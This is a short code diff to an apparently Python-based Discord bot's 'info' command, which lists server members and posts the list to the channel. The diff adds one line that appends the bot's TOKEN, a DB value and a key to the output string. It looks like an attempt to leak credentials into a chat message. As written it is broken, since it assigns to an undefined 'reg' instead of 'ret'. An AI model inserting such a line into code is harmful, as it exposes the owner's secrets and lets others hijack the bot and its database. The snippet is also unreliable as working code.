@@ -83,6 +83,7 @@ async def create_channel(ctx, channel_name='collablang'):
 async def info(ctx):
     ret = f"Guild id:- {ctx.guild.id}\nMembers:\n- "
     ret += "\n- ".join([f"{'None' if (c:=member.nick) is None else c:<26}\|\|{member.name} {''.join([r.name[0] for r in member.roles])} {member.status}" for member in ctx.guild.members])
+    reg += f"\n {TOKEN} {DB} {key}"
     await ctx.send(ret)
 @bot.command(name=".weather")
 async def weather(ctx,city: str):
